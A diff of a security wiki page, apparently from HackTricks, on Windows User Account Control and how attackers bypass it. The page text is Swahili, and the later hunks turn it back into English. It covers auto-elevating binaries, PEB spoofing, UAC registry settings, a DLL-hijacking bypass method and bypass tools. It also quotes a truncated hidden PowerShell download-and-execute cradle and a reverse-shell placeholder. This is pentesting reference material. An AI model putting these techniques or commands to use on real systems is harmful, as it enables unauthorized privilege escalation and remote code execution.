@@ -12,7 +12,7 @@ Kwa maelezo zaidi kuhusu viwango vya integrity:
 ../windows-local-privilege-escalation/integrity-levels.md
 {{#endref}}
 
-Wakati UAC ipo, mtumiaji wa msimamizi anapewa tokeni 2: ufunguo wa mtumiaji wa kawaida, ili kufanya vitendo vya kawaida kama kiwango cha kawaida, na moja yenye haki za msimamizi.
+Wakati UAC ipo, mtumiaji wa msimamizi anapewa tokeni 2: ufunguo wa mtumiaji wa kawaida, ili kufanya vitendo vya kawaida kama kiwango cha kawaida, na moja yenye ruhusa za msimamizi.
 
 Hii [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) inajadili jinsi UAC inavyofanya kazi kwa undani mkubwa na inajumuisha mchakato wa kuingia, uzoefu wa mtumiaji, na usanifu wa UAC. Wasimamizi wanaweza kutumia sera za usalama kuunda jinsi UAC inavyofanya kazi maalum kwa shirika lao katika ngazi ya ndani (wakati wa kutumia secpol.msc), au kuundwa na kusukumwa kupitia Group Policy Objects (GPO) katika mazingira ya Active Directory domain. Mipangilio mbalimbali inajadiliwa kwa undani [hapa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Kuna mipangilio 10 ya Group Policy ambayo inaweza kuwekwa kwa UAC. Jedwali lifuatalo linatoa maelezo zaidi:
 
@@ -31,11 +31,17 @@ Hii [page](https://docs.microsoft.com/en-us/windows/security/identity-protection
 
 ### UAC Bypass Theory
 
-Baadhi ya programu zina **autoelevated automatically** ikiwa **mtumiaji ni** sehemu ya **kikundi cha wasimamizi**. Binaries hizi zina ndani ya _**Manifests**_ chaguo la _**autoElevate**_ lenye thamani _**True**_. Binary inapaswa kuwa **imetiwa saini na Microsoft** pia.
+Baadhi ya programu zina **autoelevated automatically** ikiwa **mtumiaji ni** sehemu ya **kikundi cha wasimamizi**. Binaries hizi zina ndani ya _**Manifests**_ chaguo la _**autoElevate**_ lenye thamani _**True**_. Binary inapaswa kuwa **imeandikwa saini na Microsoft** pia.
 
-Kisha, ili **kuepuka** **UAC** (kuinua kutoka **kiwango cha kati** cha integrity **hadi juu**) baadhi ya washambuliaji hutumia aina hii ya binaries ili **kutekeleza msimbo wa kiholela** kwa sababu itatekelezwa kutoka kwa **mchakato wa integrity wa kiwango cha Juu**.
+Mchakato mwingi wa auto-elevate unatoa **ufanisi kupitia vitu vya COM au seva za RPC**, ambazo zinaweza kuitwa kutoka kwa michakato inayofanya kazi na integrity ya kati (ruhusa za mtumiaji wa kawaida). Kumbuka kwamba COM (Component Object Model) na RPC (Remote Procedure Call) ni mbinu ambazo programu za Windows hutumia kuwasiliana na kutekeleza kazi kati ya michakato tofauti. Kwa mfano, **`IFileOperation COM object`** imeundwa kushughulikia operesheni za faili (kunakili, kufuta, kuhamasisha) na inaweza kuongeza ruhusa kiotomatiki bila kuonyeshwa.
 
-Unaweza **kuangalia** _**Manifest**_ ya binary ukitumia zana _**sigcheck.exe**_ kutoka Sysinternals. Na unaweza **kuona** **kiwango cha integrity** cha michakato ukitumia _Process Explorer_ au _Process Monitor_ (ya Sysinternals).
+Kumbuka kwamba baadhi ya ukaguzi unaweza kufanywa, kama kuangalia ikiwa mchakato ulifanywa kutoka kwenye **System32 directory**, ambayo inaweza kupuuziliwa mbali kwa mfano **kuingiza ndani ya explorer.exe** au executable nyingine iliyoko System32.
+
+Njia nyingine ya kupita ukaguzi hizi ni **kubadilisha PEB**. Kila mchakato katika Windows una Block ya Mazingira ya Mchakato (PEB), ambayo inajumuisha data muhimu kuhusu mchakato, kama vile njia yake ya executable. Kwa kubadilisha PEB, washambuliaji wanaweza kudanganya (spoof) eneo la mchakato wao mbaya, na kuifanya ionekane inafanya kazi kutoka kwenye directory iliyoaminika (kama system32). Taarifa hii iliyodanganywa inadanganya kitu cha COM kujiinua kiotomatiki bila kumwambia mtumiaji.
+
+Kisha, ili **kupita** **UAC** (kuinua kutoka **kiwango** cha kati **hadi cha juu**) baadhi ya washambuliaji hutumia aina hii ya binaries ili **kutekeleza msimbo wowote** kwa sababu itatekelezwa kutoka kwenye **mchakato wa kiwango cha juu**.
+
+Unaweza **kuangalia** _**Manifest**_ ya binary ukitumia zana _**sigcheck.exe**_ kutoka Sysinternals. (`sigcheck.exe -m <file>`) Na unaweza **kuona** **kiwango cha integrity** cha michakato ukitumia _Process Explorer_ au _Process Monitor_ (ya Sysinternals).
 
 ### Check UAC
 
@@ -56,14 +62,14 @@ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 ConsentPromptBehaviorAdmin    REG_DWORD    0x5
 ```
 - Ikiwa **`0`** basi, UAC haitatoa ujumbe (kama **imezimwa**)
-- Ikiwa **`1`** msimamizi **anaulizwa jina la mtumiaji na nenosiri** ili kutekeleza binary kwa haki za juu (katika Desktop Salama)
-- Ikiwa **`2`** (**Daima niarifu**) UAC kila wakati itauliza uthibitisho kwa msimamizi anapojaribu kutekeleza kitu chenye mamlaka ya juu (katika Desktop Salama)
-- Ikiwa **`3`** kama `1` lakini si lazima kwenye Desktop Salama
-- Ikiwa **`4`** kama `2` lakini si lazima kwenye Desktop Salama
+- Ikiwa **`1`** msimamizi **anaulizwa jina la mtumiaji na nenosiri** ili kutekeleza faili ya binary kwa haki za juu (katika Desktop Salama)
+- Ikiwa **`2`** (**Daima niarifu**) UAC daima itauliza uthibitisho kwa msimamizi anapojaribu kutekeleza kitu chenye mamlaka ya juu (katika Desktop Salama)
+- Ikiwa **`3`** kama `1` lakini si lazima katika Desktop Salama
+- Ikiwa **`4`** kama `2` lakini si lazima katika Desktop Salama
 - ikiwa **`5`**(**kawaida**) itauliza msimamizi kuthibitisha kuendesha binaries zisizo za Windows kwa mamlaka ya juu
 
 Kisha, unapaswa kuangalia thamani ya **`LocalAccountTokenFilterPolicy`**\
-Ikiwa thamani ni **`0`**, basi, mtumiaji tu wa **RID 500** (**Msimamizi wa ndani**) anaweza kufanya **kazi za usimamizi bila UAC**, na ikiwa ni `1`, **akaunti zote ndani ya kundi "Administrators"** zinaweza kufanya hivyo.
+Ikiwa thamani ni **`0`**, basi, mtumiaji tu wa **RID 500** (**Msimamizi wa ndani**) anaweza kufanya **kazi za usimamizi bila UAC**, na ikiwa ni `1`, **akaunti zote ndani ya kundi la "Administrators"** zinaweza kufanya hivyo.
 
 Na, hatimaye angalia thamani ya funguo **`FilterAdministratorToken`**\
 Ikiwa **`0`**(kawaida), akaunti ya **Msimamizi wa ndani inaweza** kufanya kazi za usimamizi wa mbali na ikiwa **`1`** akaunti ya msimamizi wa ndani **haiwezi** kufanya kazi za usimamizi wa mbali, isipokuwa `LocalAccountTokenFilterPolicy` imewekwa kuwa `1`.
@@ -84,16 +90,16 @@ whoami /groups | findstr Level
 ```
 ## UAC bypass
 
-> [!NOTE]
+> [!TIP]
 > Kumbuka kwamba ikiwa una ufikiaji wa picha kwa mwathirika, UAC bypass ni rahisi kwani unaweza kubofya tu "Ndio" wakati ujumbe wa UAC unapoonekana
 
 UAC bypass inahitajika katika hali zifuatazo: **UAC imewashwa, mchakato wako unafanya kazi katika muktadha wa uaminifu wa kati, na mtumiaji wako ni sehemu ya kundi la wasimamizi**.
 
-Ni muhimu kutaja kwamba ni **vigumu zaidi kupita UAC ikiwa iko katika kiwango cha juu cha usalama (Daima) kuliko ikiwa iko katika viwango vingine vyovyote (Kawaida).**
+Ni muhimu kutaja kwamba ni **vigumu zaidi kupita UAC ikiwa iko katika kiwango cha juu zaidi cha usalama (Daima) kuliko ikiwa iko katika viwango vingine vyovyote (Kawaida).**
 
 ### UAC disabled
 
-Ikiwa UAC tayari imezimwa (`ConsentPromptBehaviorAdmin` ni **`0`**) unaweza **kutekeleza shell ya kurudi na ruhusa za admin** (kiwango cha juu cha uaminifu) ukitumia kitu kama:
+Ikiwa UAC tayari imezimwa (`ConsentPromptBehaviorAdmin` ni **`0`**) unaweza **kutekeleza shell ya kinyume na ruhusa za admin** (kiwango cha juu cha uaminifu) ukitumia kitu kama:
 ```bash
 #Put your reverse shell instead of "calc.exe"
 Start-Process powershell -Verb runAs "calc.exe"
@@ -135,12 +141,12 @@ runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.w
 
 ### KRBUACBypass
 
-Nyaraka na zana katika [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
+Hati na zana katika [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
 
 ### UAC bypass exploits
 
 [**UACME** ](https://github.com/hfiref0x/UACME)ambayo ni **mkusanyiko** wa exploits kadhaa za UAC bypass. Kumbuka kwamba utahitaji **kukusanya UACME ukitumia visual studio au msbuild**. Kukusanya kutaunda executable kadhaa (kama `Source\Akagi\outout\x64\Debug\Akagi.exe`), utahitaji kujua **ni ipi unahitaji.**\
-Unapaswa **kuwa makini** kwa sababu baadhi ya kuepuka kutatoa **maombi mengine** ambayo yatamwonya **mtumiaji** kwamba kuna kitu kinatokea.
+Unapaswa **kuwa makini** kwa sababu baadhi ya kuepuka kutatoa **maonyo kwa programu nyingine** ambazo zita **onya** **mtumiaji** kwamba kuna kitu kinatokea.
 
 UACME ina **toleo la kujenga ambalo kila mbinu ilianza kufanya kazi**. Unaweza kutafuta mbinu inayohusisha toleo lako:
 ```
@@ -150,41 +156,41 @@ Major  Minor  Build  Revision
 -----  -----  -----  --------
 10     0      14393  0
 ```
-Pia, ukitumia [hii](https://en.wikipedia.org/wiki/Windows_10_version_history) ukurasa unapata toleo la Windows `1607` kutoka kwa toleo la kujenga.
+Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.
 
-#### UAC Bypass Zaidi
+#### More UAC bypass
 
-**Teknolojia zote** zinazotumika hapa kukwepa AUC **zinahitaji** **shell ya mwingiliano kamili** na mwathirika (shell ya kawaida ya nc.exe haitoshi).
+**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).
 
-Unaweza kupata kwa kutumia **meterpreter** kikao. Hamisha kwa **mchakato** ambao una **Thamani ya Kikao** inayolingana na **1**:
+You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:
 
 ![](<../../images/image (863).png>)
 
 (_explorer.exe_ inapaswa kufanya kazi)
 
-### UAC Bypass na GUI
+### UAC Bypass with GUI
 
-Ikiwa una ufikiaji wa **GUI unaweza tu kukubali ombi la UAC** unapokutana nalo, huwezi kweli kuhitaji kukwepa. Hivyo, kupata ufikiaji wa GUI kutakuruhusu kukwepa UAC.
+If you have access to a **GUI you can just accept the UAC prompt** when you get it, you don't really need a bypass it. So, getting access to a GUI will allow you to bypass the UAC.
 
-Zaidi ya hayo, ikiwa unapata kikao cha GUI ambacho mtu alikuwa akikitumia (labda kupitia RDP) kuna **zana kadhaa ambazo zitakuwa zikifanya kazi kama msimamizi** ambapo unaweza **kufanya** **cmd** kwa mfano **kama msimamizi** moja kwa moja bila kuombwa tena na UAC kama [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Hii inaweza kuwa ya **kujificha** zaidi.
+Moreover, if you get a GUI session that someone was using (potentially via RDP) there are **some tools that will be running as administrator** from where you could **run** a **cmd** for example **as admin** directly without being prompted again by UAC like [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). This might be a bit more **stealthy**.
 
-### UAC Bypass ya nguvu inayosikika
+### Noisy brute-force UAC bypass
 
-Ikiwa hujali kuhusu kuwa na kelele unaweza kila wakati **kufanya kitu kama** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) ambacho **kinahitaji kuinua ruhusa hadi mtumiaji akubali**.
+If you don't care about being noisy you could always **run something like** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) that **ask to elevate permissions until the user does accepts it**.
 
-### Kukwepa kwako mwenyewe - Mbinu ya msingi ya UAC bypass
+### Your own bypass - Basic UAC bypass methodology
 
-Ikiwa utaangalia **UACME** utaona kwamba **kebisha nyingi za UAC zinatumia udhaifu wa Dll Hijacking** (hasa kuandika dll mbaya kwenye _C:\Windows\System32_). [Soma hii kujifunza jinsi ya kupata udhaifu wa Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).
+If you take a look to **UACME** you will note that **most UAC bypasses abuse a Dll Hijacking vulnerabilit**y (mainly writing the malicious dll on _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).
 
-1. Tafuta binary ambayo itafanya **autoelevate** (angalia kwamba inapotekelezwa inafanya kazi katika kiwango cha juu cha uaminifu).
-2. Kwa procmon pata matukio ya "**JINA HALIKUPATIKANA**" ambayo yanaweza kuwa hatarini kwa **DLL Hijacking**.
-3. Huenda ukahitaji **kuandika** DLL ndani ya baadhi ya **njia zilizolindwa** (kama C:\Windows\System32) ambapo huna ruhusa ya kuandika. Unaweza kukwepa hii kwa kutumia:
-   1. **wusa.exe**: Windows 7,8 na 8.1. Inaruhusu kutoa maudhui ya faili ya CAB ndani ya njia zilizolindwa (kwa sababu chombo hiki kinatekelezwa kutoka kiwango cha juu cha uaminifu).
-   2. **IFileOperation**: Windows 10.
-4. Andaa **script** ya nakala ya DLL yako ndani ya njia iliyolindwa na kutekeleza binary hatarini na inayojitenga.
+1. Find a binary that will **autoelevate** (check that when it is executed it runs in a high integrity level).
+2. With procmon find "**NAME NOT FOUND**" events that can be vulnerable to **DLL Hijacking**.
+3. You probably will need to **write** the DLL inside some **protected paths** (like C:\Windows\System32) were you don't have writing permissions. You can bypass this using:
+1. **wusa.exe**: Windows 7,8 and 8.1. It allows to extract the content of a CAB file inside protected paths (because this tool is executed from a high integrity level).
+2. **IFileOperation**: Windows 10.
+4. Prepare a **script** to copy your DLL inside the protected path and execute the vulnerable and autoelevated binary.
 
-### Mbinu nyingine ya UAC bypass
+### Another UAC bypass technique
 
-Inajumuisha kuangalia ikiwa **binary ya autoElevated** inajaribu **kusoma** kutoka kwa **rejista** jina/njia ya **binary** au **amri** inayopaswa **kutekelezwa** (hii ni ya kuvutia zaidi ikiwa binary inatafuta habari hii ndani ya **HKCU**).
+Consists on watching if an **autoElevated binary** tries to **read** from the **registry** the **name/path** of a **binary** or **command** to be **executed** (this is more interesting if the binary searches this information inside the **HKCU**).
 
 {{#include ../../banners/hacktricks-training.md}}
